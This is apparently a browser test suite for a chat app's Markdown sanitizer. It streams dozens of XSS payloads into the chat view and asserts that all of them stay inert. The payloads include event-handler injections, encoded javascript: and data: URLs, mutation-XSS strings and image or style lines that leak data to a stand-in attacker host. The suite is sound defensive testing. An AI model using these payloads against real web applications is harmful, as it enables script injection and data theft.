/**
 * SA-001: chat Markdown must be inert in the real browser sink.
 *
 *   node --test tests/frontend/chat_markdown.test.mjs
 *
 * Needs `npm ci` (Playwright plus the pinned browser libraries) and Chromium
 * (`npx playwright install chromium`). No network: see chat_harness.mjs.
 *
 * Every hostile fixture calls window.__xss('<id>') if it ever runs, so an
 * execution is observed directly rather than inferred from markup. The
 * invariants in chat_harness.mjs (__inspect) are independent of the
 * sanitizer's configuration.
 */
import { test, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { launch, openChat, sendChat, serverChunks, PAGE_URL } from './chat_harness.mjs';

const IMG = `<img src=x onerror="__xss('img-onerror')">`;
const DATA_B64 = Buffer.from("<script>parent.__xss('data-b64')</script>").toString('base64');

// Link payloads whose target must never survive as an href.
const HOSTILE_URLS = [
  `[md-js](javascript:__xss('md-js'))`,
  `[md-js-upper](JAVASCRIPT:__xss('md-js-upper'))`,
  `[md-entity](&#106;avascript:__xss('md-entity'))`,
  `[md-hex-entity](&#x6A;avascript:__xss('md-hex'))`,
  `[md-tab](java&#x09;script:__xss('md-tab'))`,
  `[md-pct](%6Aavascript:__xss('md-pct'))`,
  `[md-angle](<javascript:__xss('md-angle')>)`,
  `<javascript:__xss('autolink')>`,
  `[md-data](data:text/html;base64,${DATA_B64})`,
  `[md-vbs](vbscript:msgbox)`,
  `[md-proto-relative](//attacker.test/x)`,
  `[md-relative](/auth/logout)`,
  `<a href="javascript&colon;__xss('named-colon')">c</a>`,
  `<a href=" javascript:__xss('leading-space')">c</a>`,
  `<a href="jav&#x0A;ascript:__xss('newline-entity')">c</a>`,
  `<a href="&#0000106avascript:__xss('padded-entity')">c</a>`,
  `<a href="\u0001javascript:__xss('control-char')">c</a>`,
  `<a href="data:text/html,<script>parent.__xss('data-href')</script>">c</a>`,
];

const HOSTILE_HTML = [
  IMG,
  `<img src=x onerror=__xss('img-unterminated')`,
  `<<img src=x onerror=__xss('img-double-bracket')>>`,
  `<IMG SRC=x OnErRoR=__xss('img-case')>`,
  `<img src="x" onerror="&#95;&#95;xss('img-entity')">`,
  `![leak](https://attacker.test/leak.png?q=secret)`,
  `![x](x" onerror="__xss('md-image-quote'))`,
  `<svg onload=__xss('svg-onload')>`,
  `<svg><script>__xss('svg-script')</script></svg>`,
  `<svg><animate onbegin=__xss('svg-animate') attributeName=x dur=1s>`,
  `<svg><a xlink:href="javascript:__xss('svg-xlink')"><text x=20 y=20>t</text></a></svg>`,
  `<svg><foreignObject><img src=x onerror=__xss('svg-foreign')></foreignObject></svg>`,
  `<math><mtext><table><mglyph><style><img src=x onerror=__xss('mxss-mglyph')>`,
  `<form><math><mtext></form><form><mglyph><style></math><img src onerror=__xss('mxss-form')>`,
  `<noscript><p title="</noscript><img src=x onerror=__xss('noscript')>">`,
  `<scr<script>ipt>__xss('split-script')</script>`,
  `<script>__xss('script')</script>`,
  `<details open ontoggle=__xss('details')>d</details>`,
  `<iframe srcdoc="<script>parent.__xss('iframe')</script>"></iframe>`,
  `<object data="javascript:__xss('object')"></object>`,
  `<embed src="javascript:__xss('embed')">`,
  `<video><source onerror=__xss('video-source')></video>`,
  `<input autofocus onfocus=__xss('autofocus')>`,
  `<body onload=__xss('body')>`,
  `<style>@import 'https://attacker.test/x.css';</style>`,
  `<p style="background-image:url(https://attacker.test/bg.png)">styled</p>`,
  `<link rel=stylesheet href="https://attacker.test/l.css">`,
  `<base href="https://attacker.test/">`,
  `<meta http-equiv="refresh" content="0;url=javascript:__xss('meta')">`,
  `<a href="https://ok.test/a" onclick="__xss('onclick')" onmouseover="__xss('hover')">ok</a>`,
  `<a href="https://ok.test/a"><img src=x onerror=__xss('img-in-link')></a>`,
  `<p class="chat-overlay" id="saGetToken">clobber</p>`,
  `<form name="saGetToken"><button formaction="javascript:__xss('formaction')">b</button></form>`,
  `<table><tr><td background="javascript:__xss('td-bg')">c</td></tr></table>`,
  `[title-break](https://ok.test/t "x\\" onmouseover=\\"__xss('title')")`,
  "`<img src=x onerror=__xss('inline-code')>`",
  "```html\n<img src=x onerror=__xss('fenced-code')>\n```",
];

const HOSTILE = [...HOSTILE_HTML, ...HOSTILE_URLS];

let browser;
before(async () => { browser = await launch(); });
after(async () => { await browser?.close(); });

async function withChat(options, fn) {
  const session = await openChat(browser, options);
  try { return await fn(session); } finally { await session.context.close(); }
}

async function assertInert(session) {
  const { page, blocked, dialogs } = session;
  const state = await page.evaluate(() => ({ hits: window.__xssHits, violations: window.__sinkViolations }));
  assert.deepEqual(state.hits, [], 'a fixture executed');
  assert.deepEqual(state.violations, [], 'unsafe markup reached the chat sink');
  assert.deepEqual(dialogs, []);
  assert.deepEqual(blocked.filter((u) => u.includes('attacker.test')), [], 'content fetched a third-party URL');
  assert.equal(page.url(), PAGE_URL, 'the app page navigated away');
}

test('sink: a harmless img/onerror fixture split mid-tag cannot execute', async () => {
  await withChat({}, async (session) => {
    const { page } = session;
    // Track what each committed partial of the reply looked like.
    await page.evaluate(() => {
      window.__bubbleTexts = [];
      new MutationObserver(() => {
        const all = document.querySelectorAll('.chat-md');
        const t = all[all.length - 1].textContent;
        if (!window.__bubbleTexts.includes(t)) window.__bubbleTexts.push(t);
      }).observe(document.getElementById('root'), { subtree: true, childList: true, characterData: true });
    });
    const bubble = await sendChat(page, {
      tokens: ['Hello <img src=x on', `error="__xss('img-split')"`, '> and ', IMG, ' world'],
      gapMs: 60,
    });
    await assertInert(session);
    assert.equal(await bubble.locator('img').count(), 0);
    const text = await bubble.textContent();
    assert.match(text, /Hello/);
    assert.match(text, /world/);
    assert.ok(text.includes(IMG), 'raw HTML should stay visible as text');
    const partials = await page.evaluate(() => window.__bubbleTexts);
    assert.ok(partials.some((t) => t.includes('Hello') && !t.includes('world')),
              `no partial reply reached the sink: ${JSON.stringify(partials)}`);
  });
});

test('sink: hostile HTML and URLs streamed in server-sized chunks stay inert', async () => {
  await withChat({}, async (session) => {
    const { page } = session;
    const bubble = await sendChat(page, { tokens: serverChunks(HOSTILE.join('\n\n')), gapMs: 5 });
    await assertInert(session);
    // Raw HTML is shown, not dropped: a quoted snippet stays readable.
    const text = await bubble.textContent();
    for (const shown of [`<svg onload=__xss('svg-onload')>`, `<script>__xss('script')</script>`,
                         `<p class="chat-overlay" id="saGetToken">clobber</p>`]) {
      assert.ok(text.includes(shown), `not visible as text: ${shown}`);
    }
    // The only surviving link target is the Markdown https link.
    const hrefs = await bubble.locator('[href]').evaluateAll((els) => els.map((e) => e.getAttribute('href')));
    assert.deepEqual(hrefs, ['https://ok.test/t']);
    assert.ok(await page.evaluate(() => window.__sinkRenders) > 10);
  });
});

test('sink: the blocking /ui/chat fallback reply is sanitized too', async () => {
  await withChat({}, async (session) => {
    const bubble = await sendChat(session.page, {
      streamFails: true,
      reply: `Fallback ${IMG} [x](javascript:__xss('fallback-link')) <svg onload=__xss('fallback-svg')>`,
    });
    await assertInert(session);
    assert.match(await bubble.textContent(), /Fallback/);
    assert.equal(await bubble.locator('img, svg, a[href]').count(), 0);
  });
});

test('sink: ordinary Markdown still renders (text, links, code fences, tables)', async () => {
  const md = [
    '### Market note',
    'Close was **up** and *steady*, ~~flat~~ no more. Rupee ₹1,234.50 and 5 < 6 & 7 > 3.',
    'Line one\nline two',
    '- first\n- second',
    '3. third\n4. fourth',
    '> quoted view',
    'See [NSE](https://www.nseindia.com/) or https://example.test/auto for more.',
    '```js\nconst tag = \'<b>x</b>\';\n```',
    'Inline `a < b` code.',
    '| Stock | Close |\n|:------|------:|\n| TCS | 3,900 |',
  ].join('\n\n');
  await withChat({}, async (session) => {
    const bubble = await sendChat(session.page, { tokens: serverChunks(md) });
    await assertInert(session);
    const got = await bubble.evaluate((el) => ({
      h3: el.querySelector('h3')?.textContent,
      strong: el.querySelector('strong')?.textContent,
      em: el.querySelector('em')?.textContent,
      del: el.querySelector('del')?.textContent,
      brs: el.querySelectorAll('br').length,
      ul: [...el.querySelectorAll('ul > li')].map((li) => li.textContent),
      olStart: el.querySelector('ol')?.getAttribute('start'),
      ol: [...el.querySelectorAll('ol > li')].map((li) => li.textContent),
      quote: el.querySelector('blockquote')?.textContent.trim(),
      links: [...el.querySelectorAll('a')].map((a) => ({ href: a.getAttribute('href'), text: a.textContent,
        target: a.getAttribute('target'), rel: a.getAttribute('rel') })),
      fence: el.querySelector('pre > code')?.textContent,
      inline: [...el.querySelectorAll('p > code')].map((c) => c.textContent),
      bold: el.querySelectorAll('b').length,
      th: [...el.querySelectorAll('th')].map((c) => c.textContent),
      td: [...el.querySelectorAll('td')].map((c) => [c.textContent, c.getAttribute('align')]),
      text: el.textContent,
    }));
    assert.equal(got.h3, 'Market note');
    assert.equal(got.strong, 'up');
    assert.equal(got.em, 'steady');
    assert.equal(got.del, 'flat');
    assert.ok(got.brs >= 1, 'a single newline should stay a line break');
    assert.deepEqual(got.ul, ['first', 'second']);
    assert.equal(got.olStart, '3');
    assert.deepEqual(got.ol, ['third', 'fourth']);
    assert.equal(got.quote, 'quoted view');
    assert.deepEqual(got.links.map((l) => [l.href, l.text]),
                     [['https://www.nseindia.com/', 'NSE'], ['https://example.test/auto', 'https://example.test/auto']]);
    for (const l of got.links) {
      assert.equal(l.target, '_blank');
      assert.ok(l.rel.split(' ').includes('noopener') && l.rel.split(' ').includes('noreferrer'));
    }
    assert.equal(got.fence, "const tag = '<b>x</b>';\n");
    assert.deepEqual(got.inline, ['a < b']);
    assert.equal(got.bold, 0, 'code fence content must stay text');
    assert.deepEqual(got.th, ['Stock', 'Close']);
    assert.deepEqual(got.td, [['TCS', 'left'], ['3,900', 'right']]);
    assert.match(got.text, /Rupee ₹1,234\.50 and 5 < 6 & 7 > 3\./);
  });
});

async function assertPopupIsolated(context, link, urlPattern) {
  const [popup] = await Promise.all([context.waitForEvent('page'), link.click()]);
  await popup.waitForLoadState();
  assert.match(popup.url(), urlPattern);
  assert.equal(await popup.evaluate(() => window.opener), null, 'the new tab can control the app');
  assert.equal(await popup.evaluate(() => document.referrer), '');
  await popup.close();
}

test('sink: links open in a new tab that cannot reach the app window', async () => {
  await withChat({}, async (session) => {
    const { page, context } = session;
    const bubble = await sendChat(page, { tokens: serverChunks('Read [NSE](https://example.test/nse) today.') });
    await assertInert(session);
    const links = bubble.locator('a');
    assert.equal(await links.count(), 1);
    await assertPopupIsolated(context, links.first(), /^https:\/\/example\.test\/nse$/);
    assert.equal(page.url(), PAGE_URL);
  });
});

test('unit: the sanitizer alone (layer 2) keeps raw hostile HTML inert at every chunk boundary', async () => {
  await withChat({}, async (session) => {
    const { page, context } = session;
    const result = await page.evaluate((payloads) => {
      const sanitize = window.saRenderChatMarkdown.sanitizeHtml;
      const live = document.createElement('div');
      document.body.appendChild(live);
      const violations = [];
      for (const p of payloads) {
        for (let k = 1; k <= p.length; k++) {
          const html = sanitize(p.slice(0, k));
          const t = document.createElement('template');
          t.innerHTML = html;
          for (const v of window.__inspect(t.content)) violations.push(`${JSON.stringify(p.slice(0, k))}: ${v}`);
          live.innerHTML = html;
        }
      }
      // A model-set target/rel on an otherwise valid link is overridden.
      live.innerHTML = sanitize('<a href="https://example.test/raw" target="_self" rel="opener">raw</a>');
      live.id = 'layer2';
      return violations.slice(0, 20);
    }, HOSTILE);
    assert.deepEqual(result, []);
    await assertPopupIsolated(context, page.locator('#layer2 a'), /^https:\/\/example\.test\/raw$/);
    await page.waitForTimeout(1200);
    await assertInert(session);
  });
});

test('unit: the full renderer keeps every chunk boundary of every hostile payload inert', async () => {
  await withChat({}, async (session) => {
    const { page } = session;
    const result = await page.evaluate((payloads) => {
      const live = document.createElement('div');
      document.body.appendChild(live);
      const violations = [];
      let renders = 0;
      for (const p of payloads) {
        for (let k = 1; k <= p.length; k++) {
          const html = window.saRenderChatMarkdown(p.slice(0, k));
          const t = document.createElement('template');
          t.innerHTML = html;
          for (const v of window.__inspect(t.content)) violations.push(`${JSON.stringify(p.slice(0, k))}: ${v}`);
          live.innerHTML = html;   // also mount it, so a surviving handler would fire
          renders += 1;
        }
      }
      return { violations: violations.slice(0, 20), renders };
    }, HOSTILE);
    assert.deepEqual(result.violations, []);
    assert.equal(result.renders, HOSTILE.reduce((n, p) => n + p.length, 0));
    await page.waitForTimeout(1200);
    await assertInert(session);
  });
});

test('unit: encoded and obfuscated protocols never survive as a link target', async () => {
  await withChat({}, async ({ page }) => {
    const hrefs = await page.evaluate((payloads) => payloads.map((p) => {
      const t = document.createElement('template');
      t.innerHTML = window.saRenderChatMarkdown(p);
      return [...t.content.querySelectorAll('[href]')].map((e) => e.getAttribute('href'));
    }), HOSTILE_URLS);
    hrefs.forEach((h, i) => assert.deepEqual(h, [], `href survived for ${HOSTILE_URLS[i]}`));
    const safe = await page.evaluate(() => {
      const t = document.createElement('template');
      t.innerHTML = window.saRenderChatMarkdown('[a](https://ok.test/p?q=1) [b](HTTP://ok.test/u)');
      return [...t.content.querySelectorAll('a[href]')].map((e) => e.getAttribute('href'));
    });
    assert.deepEqual(safe, ['https://ok.test/p?q=1', 'HTTP://ok.test/u']);
  });
});

test('unit: safe Markdown maps to its expected elements', async () => {
  const cases = [
    ['**bold**', 'strong', 'bold'],
    ['*em*', 'em', 'em'],
    ['~~gone~~', 'del', 'gone'],
    ['`a<b`', 'code', 'a<b'],
    ['# Head', 'h1', 'Head'],
    ['> q', 'blockquote', 'q'],
    ['- a\n- b', 'ul > li', 'a'],
    ['7. x', 'ol[start="7"] > li', 'x'],
    ['| A | B |\n|---|--:|\n| 1 | 2 |', 'td[align="right"]', '2'],
    ['[t](https://ok.test/p)', 'a[href="https://ok.test/p"][target="_blank"]', 't'],
    ['a\nb', 'p > br', ''],
    ['line<br>break', 'p > br', ''],
    ['---', 'hr', ''],
    ['<b>x</b> and <u>y</u>', 'p', '<b>x</b> and <u>y</u>'],   // raw HTML stays text
  ];
  await withChat({}, async ({ page }) => {
    const got = await page.evaluate((cs) => cs.map(([md, sel]) => {
      const t = document.createElement('template');
      t.innerHTML = window.saRenderChatMarkdown(md);
      const el = t.content.querySelector(sel);
      return el ? el.textContent.trim() : null;
    }), cases);
    cases.forEach(([md, sel, text], i) => assert.equal(got[i], text, `${JSON.stringify(md)} -> ${sel}`));
  });
});

for (const [name, options] of [
  ['the sanitizer library does not load', { cdn: { dompurify: 'missing' } }],
  ['the marked bytes fail their SRI hash', { cdn: { marked: 'tampered' } }],
  ['chat-markdown.js does not load', { missing: ['chat-markdown.js'] }],
]) {
  test(`fail-closed: when ${name}, the reply shows as escaped text`, async () => {
    await withChat(options, async (session) => {
      const bubble = await sendChat(session.page, { tokens: ['Before ', IMG, ' after'] });
      await assertInert(session);
      assert.equal(await bubble.locator('img').count(), 0);
      assert.match(await bubble.textContent(), /Before <img src=x onerror="__xss\('img-onerror'\)"> after/);
    });
  });
}

for (const [name, options] of [['', {}], [' (chat-markdown.js did not load)', { missing: ['chat-markdown.js'] }]]) {
test(`stale cache: a pre-fix sphere.jsx renderMd cannot reach the raw parser${name}`, async () => {
  await withChat(options, async (session) => {
    const { page } = session;
    const out = await page.evaluate((payload) => {
      // renderMd exactly as it was before SA-001 (baseline 994a7b6). An older
      // service worker can still serve this file for one load after deploy.
      function renderMd(text) {
        if (!text || text === '…') return text === '…' ? '…' : '';
        if (window.marked) {
          return window.marked.parse(text);
        }
        return text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
                   .replace(/\n/g,'<br>');
      }
      const live = document.createElement('div');
      document.body.appendChild(live);
      live.innerHTML = renderMd(payload);
      return { markedGlobal: typeof window.marked, handoff: typeof window.saMarkedLib,
               imgs: live.querySelectorAll('img').length, text: live.textContent };
    }, IMG);
    assert.equal(out.markedGlobal, 'undefined');
    if (!options.missing) assert.equal(out.handoff, 'undefined', 'chat-markdown.js left the parser on window');
    assert.equal(out.imgs, 0);
    assert.equal(out.text, `<img src=x onerror="__xss('img-onerror')">`);
    await page.waitForTimeout(800);
    await assertInert(session);
  });
});
}
